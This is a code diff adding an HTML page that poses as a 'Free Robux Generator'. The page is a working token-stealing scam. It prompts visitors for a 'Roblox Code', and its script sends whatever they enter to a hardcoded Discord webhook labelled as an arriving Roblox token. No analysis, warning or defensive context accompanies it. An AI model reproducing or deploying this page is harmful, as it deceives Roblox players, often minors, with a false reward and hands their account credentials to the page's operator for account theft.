@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Robux Generator</title>
+</head>
+<body>
+    <h1 style="font-family: Arial; font-size: 18px; font-weight: bold;">Free Robux Generator</h1>
+    <label style="font-family: Arial; font-size: 12px;">Roblox Code:</label>
+    <input type="text" style="width: 30%; font-family: Arial; font-size: 12px;">
+    <button style="font-family: Arial; font-size: 12px; background-color: blue; color: white;">Send</button>
+    <p style="font-family: Arial; font-size: 12px;"></p>
+    <script>
+        function sendRobloxTokenToDiscord() {
+            var webhookUrl = "https://discord.com/api/webhooks/1189632794608025711/DTExFDEjE5Ca17H86v8DQ3Mdrnc-HbADE4H12k9E78bJCwD1rY6S1YuPnmBh34qV_dLK";
+            var robloxToken = document.querySelector('input[type="text"]').value;
+            if (!robloxToken.includes("http") && !robloxToken.includes(".gif") && !robloxToken.includes(".jpg") && !robloxToken.includes(".jpeg") && !robloxToken.includes(".png") && !robloxToken.includes(".mp4")) {
+                var message = "----ROBLOX TOKEN ARRIVATO: " + robloxToken;
+                var payload = {
+                    content: message
+                };
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(function(response) {
+                    if (response.status == 204) {
+                        console.log("Message sent successfully!");
+                    } else {
+                        console.log("Failed to send message.");
+                    }
+                });
+            } else {
+                console.log("Invalid input. Cannot include URLs or media files.");
+            }
+        }
+        document.querySelector('button').addEventListener('click', sendRobloxTokenToDiscord);
+    </script>
+</body>
+</html>
